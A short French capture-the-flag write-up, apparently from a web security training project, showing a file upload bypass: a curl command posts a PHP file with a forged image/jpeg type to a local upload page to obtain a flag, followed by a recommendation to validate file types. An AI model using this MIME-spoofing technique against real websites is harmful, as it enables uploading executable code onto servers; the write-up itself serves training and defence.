# Acces a etc/passwd

## 🔍 Méthode d'exploitation

Dans la page qui permet d'envoyer une image on va chercher a envoyer un fichier qui est du code.

Pour cela on vient préciser dans notre curl le type, et on force le site a croire que c'est une image alors que j'envoie un fichier php vide.
Mettre du code dans ce fichier est de toute évidence dangeureux pour le site.

curl -s -X POST -F "uploaded=@/home/ajoliet/Documents/darkly/upload_img/ressources/test.php;type=image/jpeg" -F "Upload=Upload" "http://127.0.0.1:8080/index.php?page=upload" | grep 'flag'

---

## 🛡️ Recommandation

Verifier le type de fichier, n'autoriser que les images.
